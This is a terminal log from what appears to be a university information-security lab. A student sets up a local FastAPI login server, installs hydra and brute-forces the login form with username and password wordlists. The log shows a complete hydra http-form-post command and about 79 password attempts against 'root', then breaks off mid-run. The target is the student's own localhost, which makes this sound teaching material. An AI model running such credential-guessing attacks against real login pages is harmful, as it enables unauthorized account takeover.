@@ -1,0 +1,530 @@
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12$ mkdir brute-force-server
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12$ cd brute-force-server/
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ python -m venv venv
+Command 'python' not found, did you mean:
+  command 'python3' from deb python3
+  command 'python' from deb python-is-python3
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ python3 -m venv venv
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ source venv/bin/activate
+(venv) sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ pip install "fastapi[standard]"
+Collecting fastapi[standard]
+  Downloading fastapi-0.142.2-py3-none-any.whl (144 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 144.4/144.4 KB 791.4 kB/s eta 0:00:00
+Collecting annotated-doc>=0.0.2
+  Downloading annotated_doc-0.0.5-py3-none-any.whl (5.3 kB)
+Collecting starlette>=0.46.0
+  Downloading starlette-1.7.0-py3-none-any.whl (78 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 79.0/79.0 KB 3.6 MB/s eta 0:00:00
+Collecting opentelemetry-api>=1.44.0
+  Downloading opentelemetry_api-1.45.0-py3-none-any.whl (60 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 60.0/60.0 KB 3.8 MB/s eta 0:00:00
+Collecting typing-extensions>=4.8.0
+  Using cached typing_extensions-4.16.0-py3-none-any.whl (45 kB)
+Collecting pydantic>=2.9.0
+  Downloading pydantic-2.13.5-py3-none-any.whl (472 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 472.6/472.6 KB 3.9 MB/s eta 0:00:00
+Collecting typing-inspection>=0.4.2
+  Downloading typing_inspection-0.4.4-py3-none-any.whl (14 kB)
+Collecting python-multipart>=0.0.18
+  Downloading python_multipart-0.0.32-py3-none-any.whl (30 kB)
+Collecting opentelemetry-sdk>=1.44.0
+  Downloading opentelemetry_sdk-1.45.0-py3-none-any.whl (140 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 140.1/140.1 KB 11.0 MB/s eta 0:00:00
+Collecting fastapi-cli[standard]>=0.0.32
+  Downloading fastapi_cli-0.0.32-py3-none-any.whl (14 kB)
+Collecting pydantic-settings>=2.0.0
+  Downloading pydantic_settings-2.15.0-py3-none-any.whl (69 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 69.4/69.4 KB 8.2 MB/s eta 0:00:00
+Collecting httpx<1.0.0,>=0.23.0
+  Using cached httpx-0.28.1-py3-none-any.whl (73 kB)
+Collecting fastar>=0.9.0
+  Downloading fastar-0.12.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (811 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 811.5/811.5 KB 8.7 MB/s eta 0:00:00
+Collecting uvicorn[standard]>=0.12.0
+  Downloading uvicorn-0.54.0-py3-none-any.whl (87 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 87.4/87.4 KB 11.2 MB/s eta 0:00:00
+Collecting opentelemetry-exporter-otlp-proto-http>=1.44.0
+  Downloading opentelemetry_exporter_otlp_proto_http-1.45.0-py3-none-any.whl (22 kB)
+Collecting jinja2>=3.1.5
+  Using cached jinja2-3.1.6-py3-none-any.whl (134 kB)
+Collecting pydantic-extra-types>=2.0.0
+  Downloading pydantic_extra_types-2.11.1-py3-none-any.whl (79 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 79.5/79.5 KB 11.2 MB/s eta 0:00:00
+Collecting email-validator>=2.0.0
+  Using cached email_validator-2.3.0-py3-none-any.whl (35 kB)
+Collecting dnspython>=2.0.0
+  Downloading dnspython-2.8.0-py3-none-any.whl (331 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 331.1/331.1 KB 10.7 MB/s eta 0:00:00
+Collecting idna>=2.0.0
+  Using cached idna-3.20-py3-none-any.whl (69 kB)
+Collecting typer>=0.16.0
+  Downloading typer-0.27.2-py3-none-any.whl (123 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 123.1/123.1 KB 11.6 MB/s eta 0:00:00
+Collecting tomli>=2.0.0
+  Using cached tomli-2.4.1-py3-none-any.whl (14 kB)
+Collecting rich-toolkit>=0.14.8
+  Downloading rich_toolkit-0.20.5-py3-none-any.whl (39 kB)
+Collecting fastapi-cloud-cli>=0.1.1
+  Downloading fastapi_cloud_cli-0.26.0-py3-none-any.whl (108 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 108.7/108.7 KB 8.4 MB/s eta 0:00:00
+Collecting anyio
+  Downloading anyio-4.15.1-py3-none-any.whl (132 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 132.1/132.1 KB 10.9 MB/s eta 0:00:00
+Collecting httpcore==1.*
+  Using cached httpcore-1.0.9-py3-none-any.whl (78 kB)
+Collecting certifi
+  Using cached certifi-2026.7.22-py3-none-any.whl (136 kB)
+Collecting h11>=0.16
+  Using cached h11-0.16.0-py3-none-any.whl (37 kB)
+Collecting MarkupSafe>=2.0
+  Using cached markupsafe-3.0.4-cp310-cp310-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (20 kB)
+Collecting opentelemetry-exporter-http-transport[urllib3]==0.66b0
+  Downloading opentelemetry_exporter_http_transport-0.66b0-py3-none-any.whl (12 kB)
+Collecting opentelemetry-proto==1.45.0
+  Downloading opentelemetry_proto-1.45.0-py3-none-any.whl (72 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 72.5/72.5 KB 7.2 MB/s eta 0:00:00
+Collecting opentelemetry-exporter-otlp-proto-common==1.45.0
+  Downloading opentelemetry_exporter_otlp_proto_common-1.45.0-py3-none-any.whl (15 kB)
+Collecting googleapis-common-protos~=1.52
+  Downloading googleapis_common_protos-1.75.5-py3-none-any.whl (307 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 307.7/307.7 KB 10.7 MB/s eta 0:00:00
+Collecting opentelemetry-exporter-otlp-common==0.66b0
+  Downloading opentelemetry_exporter_otlp_common-0.66b0-py3-none-any.whl (12 kB)
+Collecting urllib3>=1.26
+  Using cached urllib3-2.8.0-py3-none-any.whl (135 kB)
+Collecting protobuf<8.0,>=5.0
+  Downloading protobuf-7.36.2-cp310-abi3-manylinux2014_x86_64.whl (343 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 343.2/343.2 KB 10.6 MB/s eta 0:00:00
+Collecting opentelemetry-semantic-conventions==0.66b0
+  Downloading opentelemetry_semantic_conventions-0.66b0-py3-none-any.whl (206 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 206.3/206.3 KB 11.2 MB/s eta 0:00:00
+Collecting pydantic-core==2.46.5
+  Downloading pydantic_core-2.46.5-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 10.8 MB/s eta 0:00:00
+Collecting annotated-types>=0.6.0
+  Downloading annotated_types-0.8.0-py3-none-any.whl (13 kB)
+Collecting python-dotenv>=0.21.0
+  Downloading python_dotenv-1.2.4-py3-none-any.whl (23 kB)
+Collecting click>=7.0
+  Using cached click-8.5.0-py3-none-any.whl (125 kB)
+Collecting httptools>=0.8.0
+  Downloading httptools-0.8.0-cp310-cp310-manylinux1_x86_64.manylinux_2_28_x86_64.manylinux_2_5_x86_64.whl (450 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 450.0/450.0 KB 11.6 MB/s eta 0:00:00
+Collecting websockets>=13.0
+  Downloading websockets-16.1.1-cp310-cp310-manylinux1_x86_64.manylinux_2_28_x86_64.manylinux_2_5_x86_64.whl (186 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 186.0/186.0 KB 9.2 MB/s eta 0:00:00
+Collecting watchfiles>=0.20
+  Downloading watchfiles-1.3.0-cp310-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (458 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 458.4/458.4 KB 10.1 MB/s eta 0:00:00
+Collecting uvloop>=0.15.1
+  Downloading uvloop-0.23.0-cp310-cp310-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (3.9 MB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.9/3.9 MB 8.7 MB/s eta 0:00:00
+Collecting pyyaml>=5.1
+  Using cached pyyaml-6.0.3-cp310-cp310-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (770 kB)
+Collecting exceptiongroup>=1.0.2
+  Using cached exceptiongroup-1.3.1-py3-none-any.whl (16 kB)
+Collecting detect-installer>=0.1.0
+  Downloading detect_installer-0.2.1-py3-none-any.whl (5.4 kB)
+Collecting agent-detector>=1.1.0
+  Downloading agent_detector-2.0.0-py3-none-any.whl (9.4 kB)
+Collecting rignore>=0.5.1
+  Downloading rignore-0.8.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (933 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 933.9/933.9 KB 10.6 MB/s eta 0:00:00
+Collecting sentry-sdk>=2.20.0
+  Downloading sentry_sdk-2.71.0-py3-none-any.whl (534 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 534.3/534.3 KB 10.0 MB/s eta 0:00:00
+Collecting rich>=13.7.1
+  Using cached rich-15.0.0-py3-none-any.whl (310 kB)
+Collecting shellingham>=1.3.0
+  Downloading shellingham-1.5.4-py2.py3-none-any.whl (9.8 kB)
+Collecting markdown-it-py>=2.2.0
+  Using cached markdown_it_py-4.2.0-py3-none-any.whl (91 kB)
+Collecting pygments<3.0.0,>=2.13.0
+  Using cached pygments-2.21.0-py3-none-any.whl (1.3 MB)
+Collecting mdurl~=0.1
+  Using cached mdurl-0.1.2-py3-none-any.whl (10.0 kB)
+Installing collected packages: websockets, uvloop, urllib3, typing-extensions, tomli, shellingham, rignore, pyyaml, python-multipart, python-dotenv, pygments, protobuf, mdurl, MarkupSafe, idna, httptools, h11, fastar, dnspython, detect-installer, click, certifi, annotated-types, annotated-doc, agent-detector, uvicorn, typing-inspection, sentry-sdk, pydantic-core, opentelemetry-proto, opentelemetry-api, markdown-it-py, jinja2, httpcore, googleapis-common-protos, exceptiongroup, email-validator, rich, pydantic, opentelemetry-semantic-conventions, opentelemetry-exporter-otlp-proto-common, opentelemetry-exporter-http-transport, anyio, watchfiles, typer, starlette, rich-toolkit, pydantic-settings, pydantic-extra-types, opentelemetry-sdk, httpx, opentelemetry-exporter-otlp-common, fastapi, opentelemetry-exporter-otlp-proto-http, fastapi-cloud-cli, fastapi-cli
+Successfully installed MarkupSafe-3.0.4 agent-detector-2.0.0 annotated-doc-0.0.5 annotated-types-0.8.0 anyio-4.15.1 certifi-2026.7.22 click-8.5.0 detect-installer-0.2.1 dnspython-2.8.0 email-validator-2.3.0 exceptiongroup-1.3.1 fastapi-0.142.2 fastapi-cli-0.0.32 fastapi-cloud-cli-0.26.0 fastar-0.12.0 googleapis-common-protos-1.75.5 h11-0.16.0 httpcore-1.0.9 httptools-0.8.0 httpx-0.28.1 idna-3.20 jinja2-3.1.6 markdown-it-py-4.2.0 mdurl-0.1.2 opentelemetry-api-1.45.0 opentelemetry-exporter-http-transport-0.66b0 opentelemetry-exporter-otlp-common-0.66b0 opentelemetry-exporter-otlp-proto-common-1.45.0 opentelemetry-exporter-otlp-proto-http-1.45.0 opentelemetry-proto-1.45.0 opentelemetry-sdk-1.45.0 opentelemetry-semantic-conventions-0.66b0 protobuf-7.36.2 pydantic-2.13.5 pydantic-core-2.46.5 pydantic-extra-types-2.11.1 pydantic-settings-2.15.0 pygments-2.21.0 python-dotenv-1.2.4 python-multipart-0.0.32 pyyaml-6.0.3 rich-15.0.0 rich-toolkit-0.20.5 rignore-0.8.1 sentry-sdk-2.71.0 shellingham-1.5.4 starlette-1.7.0 tomli-2.4.1 typer-0.27.2 typing-extensions-4.16.0 typing-inspection-0.4.4 urllib3-2.8.0 uvicorn-0.54.0 uvloop-0.23.0 watchfiles-1.3.0 websockets-16.1.1
+
+(venv) sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ vim main.py
+(venv) sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ fastapi dev main.py
+
+ ⚡️ Starting FastAPI in development mode
+ 
+ 🐍 Using import string: main:app
+ 
+ 🌐 Server started at http://127.0.0.1:8000
+    Documentation at http://127.0.0.1:8000/docs
+ 
+  Logs:
+ 
+ ▕  Will watch for changes in these directories: 
+    ['/home/sonya/dev/auca/infosec/infosec/lab12/brute-force-server']
+ ▕  Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
+ ▕  Started reloader process [237165] using WatchFiles
+ ▕  Started server process [237172]
+ ▕  Waiting for application startup.
+ ▕  Application startup complete.
+
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ sudo apt install hydra
+[sudo] password for sonya: 
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following additional packages will be installed:
+  firebird3.0-common firebird3.0-common-doc libapr1 libaprutil1 libbson-1.0-0 libfbclient2
+  libmemcached11 libmongoc-1.0-0 libmongocrypt0 libmysqlclient21 libserf-1-1 libsvn1 libutf8proc2
+  mysql-common
+Suggested packages:
+  hydra-gtk
+The following NEW packages will be installed:
+  firebird3.0-common firebird3.0-common-doc hydra libapr1 libaprutil1 libbson-1.0-0 libfbclient2
+  libmemcached11 libmongoc-1.0-0 libmongocrypt0 libmysqlclient21 libserf-1-1 libsvn1 libutf8proc2
+  mysql-common
+0 upgraded, 15 newly installed, 0 to remove and 37 not upgraded.
+Need to get 4 453 kB of archives.
+After this operation, 16,7 MB of additional disk space will be used.
+Do you want to continue? [Y/n] y
+Get:1 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 firebird3.0-common-doc all 3.0.8.33535.ds4-1ubuntu2 [26,8 kB]
+Get:2 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 firebird3.0-common all 3.0.8.33535.ds4-1ubuntu2 [15,5 kB]
+Get:3 http://kg.archive.ubuntu.com/ubuntu jammy-updates/main amd64 libapr1 amd64 1.7.0-8ubuntu0.22.04.2 [108 kB]
+Get:4 http://kg.archive.ubuntu.com/ubuntu jammy-updates/main amd64 libaprutil1 amd64 1.6.1-5ubuntu4.22.04.3 [93,4 kB]
+Get:5 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 libbson-1.0-0 amd64 1.21.0-1build1 [83,7 kB]
+Get:6 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 libfbclient2 amd64 3.0.8.33535.ds4-1ubuntu2 [512 kB]
+Get:7 http://kg.archive.ubuntu.com/ubuntu jammy/main amd64 libmemcached11 amd64 1.0.18-4.2ubuntu4 [88,2 kB]
+Get:8 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 libmongocrypt0 amd64 1.3.0-1ubuntu1 [93,9 kB]
+Get:9 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 libmongoc-1.0-0 amd64 1.21.0-1build1 [311 kB]
+Get:10 http://kg.archive.ubuntu.com/ubuntu jammy/main amd64 mysql-common all 5.8+1.0.8 [7 212 B]
+Get:11 http://kg.archive.ubuntu.com/ubuntu jammy-updates/main amd64 libmysqlclient21 amd64 8.0.46-0ubuntu0.22.04.4 [1 336 kB]
+Get:12 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 libserf-1-1 amd64 1.3.9-10ubuntu2 [50,0 kB]
+Get:13 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 libutf8proc2 amd64 2.7.0-3 [73,9 kB]
+Get:14 http://kg.archive.ubuntu.com/ubuntu jammy-updates/universe amd64 libsvn1 amd64 1.14.1-3ubuntu0.22.04.1 [1 387 kB]
+Get:15 http://kg.archive.ubuntu.com/ubuntu jammy/universe amd64 hydra amd64 9.2-1ubuntu1 [266 kB]
+Fetched 4 453 kB in 1s (3 356 kB/s)
+Selecting previously unselected package firebird3.0-common-doc.
+(Reading database ... 311502 files and directories currently installed.)
+Preparing to unpack .../00-firebird3.0-common-doc_3.0.8.33535.ds4-1ubuntu2_all.deb ...
+Unpacking firebird3.0-common-doc (3.0.8.33535.ds4-1ubuntu2) ...
+Selecting previously unselected package firebird3.0-common.
+Preparing to unpack .../01-firebird3.0-common_3.0.8.33535.ds4-1ubuntu2_all.deb ...
+Unpacking firebird3.0-common (3.0.8.33535.ds4-1ubuntu2) ...
+Selecting previously unselected package libapr1:amd64.
+Preparing to unpack .../02-libapr1_1.7.0-8ubuntu0.22.04.2_amd64.deb ...
+Unpacking libapr1:amd64 (1.7.0-8ubuntu0.22.04.2) ...
+Selecting previously unselected package libaprutil1:amd64.
+Preparing to unpack .../03-libaprutil1_1.6.1-5ubuntu4.22.04.3_amd64.deb ...
+Unpacking libaprutil1:amd64 (1.6.1-5ubuntu4.22.04.3) ...
+Selecting previously unselected package libbson-1.0-0.
+Preparing to unpack .../04-libbson-1.0-0_1.21.0-1build1_amd64.deb ...
+Unpacking libbson-1.0-0 (1.21.0-1build1) ...
+Selecting previously unselected package libfbclient2:amd64.
+Preparing to unpack .../05-libfbclient2_3.0.8.33535.ds4-1ubuntu2_amd64.deb ...
+Unpacking libfbclient2:amd64 (3.0.8.33535.ds4-1ubuntu2) ...
+Selecting previously unselected package libmemcached11:amd64.
+Preparing to unpack .../06-libmemcached11_1.0.18-4.2ubuntu4_amd64.deb ...
+Unpacking libmemcached11:amd64 (1.0.18-4.2ubuntu4) ...
+Selecting previously unselected package libmongocrypt0:amd64.
+Preparing to unpack .../07-libmongocrypt0_1.3.0-1ubuntu1_amd64.deb ...
+Unpacking libmongocrypt0:amd64 (1.3.0-1ubuntu1) ...
+Selecting previously unselected package libmongoc-1.0-0.
+Preparing to unpack .../08-libmongoc-1.0-0_1.21.0-1build1_amd64.deb ...
+Unpacking libmongoc-1.0-0 (1.21.0-1build1) ...
+Selecting previously unselected package mysql-common.
+Preparing to unpack .../09-mysql-common_5.8+1.0.8_all.deb ...
+Unpacking mysql-common (5.8+1.0.8) ...
+Selecting previously unselected package libmysqlclient21:amd64.
+Preparing to unpack .../10-libmysqlclient21_8.0.46-0ubuntu0.22.04.4_amd64.deb ...
+Unpacking libmysqlclient21:amd64 (8.0.46-0ubuntu0.22.04.4) ...
+Selecting previously unselected package libserf-1-1:amd64.
+Preparing to unpack .../11-libserf-1-1_1.3.9-10ubuntu2_amd64.deb ...
+Unpacking libserf-1-1:amd64 (1.3.9-10ubuntu2) ...
+Selecting previously unselected package libutf8proc2:amd64.
+Preparing to unpack .../12-libutf8proc2_2.7.0-3_amd64.deb ...
+Unpacking libutf8proc2:amd64 (2.7.0-3) ...
+Selecting previously unselected package libsvn1:amd64.
+Preparing to unpack .../13-libsvn1_1.14.1-3ubuntu0.22.04.1_amd64.deb ...
+Unpacking libsvn1:amd64 (1.14.1-3ubuntu0.22.04.1) ...
+Selecting previously unselected package hydra.
+Preparing to unpack .../14-hydra_9.2-1ubuntu1_amd64.deb ...
+Unpacking hydra (9.2-1ubuntu1) ...
+Setting up mysql-common (5.8+1.0.8) ...
+update-alternatives: using /etc/mysql/my.cnf.fallback to provide /etc/mysql/my.cnf (my.cnf) in auto mode
+Setting up libmysqlclient21:amd64 (8.0.46-0ubuntu0.22.04.4) ...
+Setting up libutf8proc2:amd64 (2.7.0-3) ...
+Setting up libapr1:amd64 (1.7.0-8ubuntu0.22.04.2) ...
+Setting up firebird3.0-common-doc (3.0.8.33535.ds4-1ubuntu2) ...
+Setting up firebird3.0-common (3.0.8.33535.ds4-1ubuntu2) ...
+Setting up libbson-1.0-0 (1.21.0-1build1) ...
+Setting up libmemcached11:amd64 (1.0.18-4.2ubuntu4) ...
+Setting up libaprutil1:amd64 (1.6.1-5ubuntu4.22.04.3) ...
+Setting up libmongocrypt0:amd64 (1.3.0-1ubuntu1) ...
+Setting up libserf-1-1:amd64 (1.3.9-10ubuntu2) ...
+Setting up libfbclient2:amd64 (3.0.8.33535.ds4-1ubuntu2) ...
+Setting up libmongoc-1.0-0 (1.21.0-1build1) ...
+Setting up libsvn1:amd64 (1.14.1-3ubuntu0.22.04.1) ...
+Setting up hydra (9.2-1ubuntu1) ...
+Processing triggers for man-db (2.10.2-1) ...
+Processing triggers for libc-bin (2.35-0ubuntu3.15) ...
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$
+
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ ls
+main.py  passwords.txt  __pycache__  usernames.txt  venv
+sonya@sonya-laptop:~/dev/auca/infosec/infosec/lab12/brute-force-server$ hydra -f -I -V -L usernames.txt -P passwords.txt -s 8000 localhost http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-06 01:07:08
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1717 login tries (l:17/p:101), ~108 tries per task
+[DATA] attacking http-post-form://localhost:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target localhost - login "root" - pass "123456" - 1 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123456789" - 2 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "111111" - 3 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "password" - 4 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qwerty" - 5 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "admin" - 6 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "abc123" - 7 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12345678" - 8 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "password1" - 9 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1234567" - 10 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123123" - 11 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1234567890" - 12 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "000000" - 13 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12345" - 14 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "iloveyou" - 15 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1q2w3e4r5t" - 16 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1234" - 17 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123456a" - 18 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qwertyuiop" - 19 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "monkey" - 20 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123321" - 21 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "dragon" - 22 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "654321" - 23 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "666666" - 24 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123" - 25 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "myspace1" - 26 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "a123456" - 27 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "121212" - 28 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1qaz2wsx" - 29 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123qwe" - 30 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123abc" - 31 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "tinkle" - 32 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "target123" - 33 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "gwerty" - 34 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1g2w3e4r" - 35 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "gwerty123" - 36 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "zag12wsx" - 37 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "7777777" - 38 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qwerty1" - 39 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1q2w3e4r" - 40 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "987654321" - 41 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "222222" - 42 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qwe123" - 43 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qwerty123" - 44 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "zxcvbnm" - 45 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "555555" - 46 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "112233" - 47 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "fuckyou" - 48 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "asdfghjkl" - 49 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "12345a" - 50 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123123123" - 51 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1q2w3e" - 52 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "qazwsx" - 53 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "computer" - 54 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "aaaaaa" - 55 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "159753" - 56 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "iloveyou1" - 57 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "fuckyou1" - 58 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "princess" - 59 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "789456123" - 60 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "11111111" - 61 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123654" - 62 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "princess1" - 63 of 1717 [child 14] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "888888" - 64 of 1717 [child 15] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "linkedin" - 65 of 1717 [child 0] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "michael" - 66 of 1717 [child 1] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "sunshine" - 67 of 1717 [child 4] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "football" - 68 of 1717 [child 8] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "11111" - 69 of 1717 [child 2] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "777777" - 70 of 1717 [child 5] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "1234qwer" - 71 of 1717 [child 7] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "999999" - 72 of 1717 [child 3] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "j38ifUbn" - 73 of 1717 [child 6] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "monkey1" - 74 of 1717 [child 9] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "football1" - 75 of 1717 [child 11] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "daniel" - 76 of 1717 [child 12] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "azerty" - 77 of 1717 [child 10] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "a12345" - 78 of 1717 [child 13] (0/0)
+[ATTEMPT] target localhost - login "root" - pass "123456789a" - 79 of 1717 [child 14] (0/0)
